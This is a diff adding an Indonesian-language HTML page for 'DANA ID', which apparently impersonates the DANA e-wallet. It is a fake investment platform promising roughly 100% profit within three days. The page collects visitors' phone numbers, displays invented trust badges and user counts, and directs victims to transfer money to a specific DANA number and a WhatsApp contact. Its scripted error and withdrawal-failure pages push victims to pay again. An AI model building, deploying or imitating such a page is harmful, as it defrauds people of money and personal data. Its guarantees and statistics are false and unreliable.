@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DANA ID - Platform Investasi Digital Terpercaya</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo-container">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSGglzp3pi04sdTe7teWwIj3abbA0HHqwYcxwzXVWi5ueYhk_MwQge3tE8&s=10" alt="DANA ID Logo" class="logo">
+                <div class="logo-text">DANA ID</div>
+            </div>
+        </header>
+        
+        <!-- Login Page -->
+        <div class="card" id="loginPage" style="animation-delay: 0.1s;">
+            <h2 class="title">Masuk ke Akun DANA ID</h2>
+            <div class="form-group">
+                <label for="phoneNumber" class="form-label">
+                    <i class="fas fa-mobile-alt"></i> Nomor DANA
+                </label>
+                <input type="tel" id="phoneNumber" class="form-control" placeholder="Contoh: 0812-3456-7890" maxlength="15">
+            </div>
+            <button id="nextBtn" class="btn btn-primary">
+                <i class="fas fa-arrow-right"></i> Selanjutnya
+            </button>
+            
+            <div class="trust-badge">
+                <i class="fas fa-shield-alt"></i>
+                <div class="trust-text">
+                    <strong>Keamanan Terjamin:</strong> Data Anda dilindungi dengan enkripsi tingkat tinggi
+                </div>
+            </div>
+            
+            <div class="trust-badge-container">
+                <div class="trust-badge-item">
+                    <i class="fas fa-check"></i> Terverifikasi
+                </div>
+                <div class="trust-badge-item">
+                    <i class="fas fa-lock"></i> Aman 100%
+                </div>
+                <div class="trust-badge-item">
+                    <i class="fas fa-users"></i> 10.000+ Pengguna
+                </div>
+            </div>
+        </div>
+        
+        <!-- Loading Indicator -->
+        <div class="loading" id="loadingIndicator">
+            <div class="spinner"></div>
+            <p class="loading-text">Memverifikasi akun Anda...</p>
+        </div>
+        
+        <!-- Offers Page -->
+        <div class="offers-container" id="offersPage">
+            <!-- User Info -->
+            <div class="user-info" id="userInfo">
+                <div class="user-icon">
+                    <i class="fas fa-user"></i>
+                </div>
+                <div>
+                    <div class="user-name">Selamat Datang</div>
+                    <div class="user-number" id="userNumber"></div>
+                </div>
+            </div>
+            
+            <!-- Balance Card -->
+            <div class="balance-card">
+                <div class="balance-label">
+                    <i class="fas fa-wallet"></i> Saldo Tersedia
+                </div>
+                <div class="balance-amount" id="userBalance">Rp.0</div>
+                <div class="action-buttons">
+                    <button id="depositBtn" class="btn btn-success">
+                        <i class="fas fa-plus-circle"></i> Deposit
+                    </button>
+                    <button id="withdrawBtn" class="btn btn-primary">
+                        <i class="fas fa-money-bill-wave"></i> Penarikan
+                    </button>
+                    <button id="historyBtn" class="btn btn-outline">
+                        <i class="fas fa-history"></i> Riwayat
+                    </button>
+                </div>
+            </div>
+            
+            <div class="offers-header">
+                <h2 class="offers-title">Paket Investasi</h2>
+                <div class="offers-count">4 Paket</div>
+            </div>
+            
+            <div class="offers-slider" id="offersSlider">
+                <!-- Offer 1 -->
+                <div class="offer-card" data-amount="150000" data-profit="310000">
+                    <div class="offer-badge">TERPOPULER</div>
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRUfzQruLnyegr-kbqKDK0IMiya9uJoUAZGdcYTYkHdZz9-LzSOhNR2ZW4&s=10" alt="Investasi DANA" class="offer-image">
+                    <div class="offer-amount">Rp150.000</div>
+                    <div class="offer-profit">
+                        <i class="fas fa-chart-line"></i> Profit: Rp310.000
+                    </div>
+                    <div class="offer-duration">
+                        <i class="fas fa-clock"></i>
+                        <span>Durasi: 3 Hari</span>
+                    </div>
+                    <div class="offer-description">
+                        Investasi aman dengan return tinggi. <span class="highlight-text">100% pembayaran tepat waktu</span> sejak 2021.
+                    </div>
+                    <ul class="offer-features">
+                        <li>Bebas biaya admin</li>
+                        <li>Proses instan</li>
+                        <li>Dukungan 24/7</li>
+                    </ul>
+                </div>
+                
+                <!-- Offer 2 -->
+                <div class="offer-card" data-amount="300000" data-profit="620000">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRUfzQruLnyegr-kbqKDK0IMiya9uJoUAZGdcYTYkHdZz9-LzSOhNR2ZW4&s=10" alt="Investasi DANA" class="offer-image">
+                    <div class="offer-amount">Rp300.000</div>
+                    <div class="offer-profit">
+                        <i class="fas fa-chart-line"></i> Profit: Rp620.000
+                    </div>
+                    <div class="offer-duration">
+                        <i class="fas fa-clock"></i>
+                        <span>Durasi: 3 Hari</span>
+                    </div>
+                    <div class="offer-description">
+                        <span class="highlight-text">Best seller!</span> Rasakan keuntungan maksimal dengan modal menengah.
+                    </div>
+                    <ul class="offer-features">
+                        <li>Prioritas pembayaran</li>
+                        <li>Bonus 0.5% untuk deposit pertama</li>
+                        <li>Dukungan personal</li>
+                    </ul>
+                </div>
+                
+                <!-- Offer 3 -->
+                <div class="offer-card" data-amount="500000" data-profit="530000">
+                    <div class="offer-badge">TERBATAS</div>
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRUfzQruLnyegr-kbqKDK0IMiya9uJoUAZGdcYTYkHdZz9-LzSOhNR2ZW4&s=10" alt="Investasi DANA" class="offer-image">
+                    <div class="offer-amount">Rp500.000</div>
+                    <div class="offer-profit">
+                        <i class="fas fa-chart-line"></i> Profit: Rp530.000
+                    </div>
+                    <div class="offer-duration">
+                        <i class="fas fa-clock"></i>
+                        <span>Durasi: 3 Hari</span>
+                    </div>
+                    <div class="offer-description">
+                        Kuota terbatas! <span class="highlight-text">Bonus 1%</span> untuk 10 investor pertama setiap hari.
+                    </div>
+                    <ul class="offer-features">
+                        <li>Kuota harian terbatas</li>
+                        <li>Bonus tambahan 1%</li>
+                        <li>Laporan harian</li>
+                    </ul>
+                </div>
+                
+                <!-- Offer 4 -->
+                <div class="offer-card" data-amount="1500000" data-profit="1600000">
+                    <div class="offer-badge">VIP</div>
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRUfzQruLnyegr-kbqKDK0IMiya9uJoUAZGdcYTYkHdZz9-LzSOhNR2ZW4&s=10" alt="Investasi DANA" class="offer-image">
+                    <div class="offer-amount">Rp1.500.000</div>
+                    <div class="offer-profit">
+                        <i class="fas fa-chart-line"></i> Profit: Rp1.600.000
+                    </div>
+                    <div class="offer-duration">
+                        <i class="fas fa-clock"></i>
+                        <span>Durasi: 3 Hari</span>
+                    </div>
+                    <div class="offer-description">
+                        Paket eksklusif dengan <span class="highlight-text">prioritas pembayaran</span> dan dukungan 24/7.
+                    </div>
+                    <ul class="offer-features">
+                        <li>Manajer pribadi</li>
+                        <li>Laporan real-time</li>
+                        <li>Penarikan instan</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="trust-badge">
+                <i class="fas fa-check-circle"></i>
+                <div class="trust-text">
+                    <strong>Garansi Keamanan:</strong> Lebih dari 10.000 investor telah mempercayai kami sejak 2021
+                </div>
+            </div>
+        </div>
+        
+        <!-- Payment Page -->
+        <div class="payment-page" id="paymentPage">
+            <div class="payment-details">
+                <h2 class="payment-title">Konfirmasi Pembayaran</h2>
+                
+                <div class="payment-info">
+                    <div class="payment-label">
+                        <i class="fas fa-credit-card"></i> Nomor DANA Tujuan
+                    </div>
+                    <div class="payment-value">0851-3833-8329</div>
+                </div>
+                
+                <div class="payment-info">
+                    <div class="payment-label">
+                        <i class="fas fa-user-tie"></i> Atas Nama
+                    </div>
+                    <div class="payment-value">DANA ID OFFICIAL</div>
+                </div>
+                
+                <div class="payment-amount" id="paymentAmount">Rp0</div>
+                
+                <div class="payment-instruction">
+                    <p><strong><i class="fas fa-info-circle"></i> Petunjuk Pembayaran:</strong></p>
+                    <ol>
+                        <li>Buka aplikasi DANA di smartphone Anda</li>
+                        <li>Pilih menu "Kirim" atau "Transfer"</li>
+                        <li>Masukkan nomor DANA tujuan di atas</li>
+                        <li>Masukkan nominal sesuai penawaran yang dipilih</li>
+                        <li>Konfirmasi dan selesaikan pembayaran</li>
+                        <li>Screenshot bukti transfer untuk konfirmasi</li>
+                    </ol>
+                </div>
+                
+                <div class="payment-warning">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <div class="payment-warning-text">
+                        Pastikan nominal transfer sesuai dengan yang tertera di atas. Kesalahan nominal akan mengakibatkan proses verifikasi tertunda.
+                    </div>
+                </div>
+            </div>
+            
+            <button id="confirmBtn" class="btn btn-primary">
+                <i class="fas fa-check-circle"></i> Saya Sudah Transfer
+            </button>
+            <button id="backToOffersBtn" class="btn back-btn">
+                <i class="fas fa-arrow-left"></i> Kembali ke Penawaran
+            </button>
+        </div>
+        
+        <!-- Success Page -->
+        <div class="payment-page" id="successPage" style="text-align: center; display: none;">
+            <div class="success-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h2 class="result-title">Pembayaran Berhasil!</h2>
+            <p class="result-message">
+                Terima kasih telah bergabung dengan DANA ID. Profit akan masuk otomatis dalam 3 hari. 
+                Anda akan menerima notifikasi ketika dana sudah bisa ditarik.
+            </p>
+            <button id="backToHomeBtn" class="btn btn-primary">
+                <i class="fas fa-home"></i> Kembali ke Beranda
+            </button>
+        </div>
+        
+        <!-- Error Page -->
+        <div class="payment-page" id="errorPage" style="text-align: center; display: none;">
+            <div class="error-icon">
+                <i class="fas fa-exclamation-circle"></i>
+            </div>
+            <h2 class="result-title">Pembayaran Gagal!</h2>
+            <p class="result-message">
+                Silahkan melakukan pembayaran terlebih dahulu ke nomor tujuan dengan nominal yang sesuai. 
+                Jika sudah transfer tetapi masih melihat pesan ini, silahkan hubungi CS kami.
+            </p>
+            <button id="backToPaymentBtn" class="btn btn-danger">
+                <i class="fas fa-undo"></i> Kembali ke Pembayaran
+            </button>
+        </div>
+    </div>
+    
+    <!-- Deposit Modal -->
+    <div class="modal" id="depositModal">
+        <div class="modal-content">
+            <span class="close-modal" id="closeDepositModal">&times;</span>
+            <div class="modal-icon">
+                <i class="fas fa-wallet"></i>
+            </div>
+            <h3 class="modal-title">Deposit Dana</h3>
+            <p class="modal-message">
+                Silahkan memilih salah satu paket penawaran di bawah untuk melakukan deposit. 
+                Setelah transfer, dana akan otomatis masuk ke saldo Anda dalam 1x24 jam.
+            </p>
+            <button class="btn back-btn" id="closeDepositBtn">
+                <i class="fas fa-times"></i> Tutup
+            </button>
+        </div>
+    </div>
+    
+    <!-- Withdraw Modal -->
+    <div class="modal" id="withdrawModal">
+        <div class="modal-content">
+            <span class="close-modal" id="closeWithdrawModal">&times;</span>
+            <div class="modal-icon">
+                <i class="fas fa-money-bill-wave"></i>
+            </div>
+            <h3 class="modal-title">Penarikan Dana</h3>
+            
+            <div class="modal-form">
+                <div class="form-group">
+                    <label class="form-label">Nomor DANA Tujuan</label>
+                    <input type="text" id="withdrawNumber" class="form-control" readonly>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">Nominal Penarikan (Min. Rp150.000)</label>
+                    <input type="text" id="withdrawAmount" class="form-control" placeholder="Masukkan nominal penarikan">
+                </div>
+                
+                <div class="terms">
+                    <div class="terms-title">Syarat dan Ketentuan:</div>
+                    <ul class="terms-list">
+                        <li>Minimal penarikan Rp150.000</li>
+                        <li>Proses penarikan membutuhkan waktu 1x24 jam</li>
+                        <li>Biaya admin Rp5.000 per transaksi</li>
+                        <li>Penarikan hanya bisa dilakukan ke nomor DANA yang terdaftar</li>
+                        <li>Saldo harus mencukupi setelah dipotong biaya admin</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <button id="submitWithdrawBtn" class="btn btn-primary">
+                <i class="fas fa-paper-plane"></i> Ajukan Penarikan
+            </button>
+        </div>
+    </div>
+    
+    <!-- Withdraw Error Modal -->
+    <div class="modal" id="withdrawErrorModal">
+        <div class="modal-content">
+            <span class="close-modal" id="closeWithdrawErrorModal">&times;</span>
+            <div class="modal-icon">
+                <i class="fas fa-exclamation-triangle"></i>
+            </div>
+            <h3 class="modal-title">Penarikan Gagal</h3>
+            <p class="modal-message">
+                Saldo tidak mencukupi untuk melakukan penarikan. 
+                Silahkan deposit terlebih dahulu atau ajukan penarikan dengan nominal yang lebih kecil.
+            </p>
+            <div class="modal-footer">
+                <button class="btn btn-primary" id="retryWithdrawBtn">
+                    <i class="fas fa-redo"></i> Coba Lagi
+                </button>
+                <button class="btn btn-danger" id="closeWithdrawErrorBtn">
+                    <i class="fas fa-times"></i> Tutup
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- History Modal -->
+    <div class="modal" id="historyModal">
+        <div class="modal-content">
+            <span class="close-modal" id="closeHistoryModal">&times;</span>
+            <div class="modal-icon">
+                <i class="fas fa-history"></i>
+            </div>
+            <h3 class="modal-title">Riwayat Transaksi</h3>
+            
+            <div class="history-empty">
+                <i class="far fa-folder-open"></i>
+                <p>Belum ada transaksi</p>
+            </div>
+            
+            <button class="btn back-btn" id="closeHistoryBtn">
+                <i class="fas fa-times"></i> Tutup
+            </button>
+        </div>
+    </div>
+    
+    <!-- Notification -->
+    <div class="notification" id="notification">
+        <i class="fas fa-check-circle"></i>
+        <div class="notification-content">
+            <div class="notification-title">Sukses</div>
+            <div class="notification-message">Nomor DANA berhasil dimasukkan</div>
+        </div>
+        <div class="close-notification" id="closeNotification">&times;</div>
+    </div>
+    
+    <!-- Floating WhatsApp -->
+    <a href="https://wa.me/6285167890310" class="floating-whatsapp" target="_blank">
+        <i class="fab fa-whatsapp"></i>
+    </a>
+    
+    <script src="script.js"></script>
+</body>
+</html>
